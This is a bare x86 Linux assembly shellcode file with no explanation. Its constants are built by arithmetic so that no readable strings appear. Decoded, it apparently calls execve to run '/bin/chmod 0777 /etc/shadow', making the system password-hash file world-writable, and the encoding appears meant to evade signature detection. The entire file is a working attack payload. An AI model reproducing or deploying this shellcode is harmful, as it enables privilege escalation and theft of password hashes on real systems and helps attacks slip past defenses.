global _start           

section .text

_start:
    sub edx, edx
    push edx
    mov eax, 0xb33fb33f
    sub eax, 0x3bd04ede
    push eax
    jmp short two

end:
    int 0x80

four:
    push edx
    push esi
    push ebp
    push ebx
    mov ecx, esp
    push byte 0xc
    pop eax
    dec eax
    jmp short end

three:
    push edx
    sub eax, 0x2c3d2dff
    push eax
    mov ebp, esp
    push edx
    add eax, 0x2d383638
    push eax
    sub eax, 0x013ffeff
    push eax
    sub eax, 0x3217d6d2
    add eax, 0x31179798
    push eax
    mov ebx, esp
    jmp short four

two:
    sub eax, 0x0efc3532
    push eax
    sub eax, 0x04feca01
    inc eax
    push eax
    mov esi, esp
    jmp short three
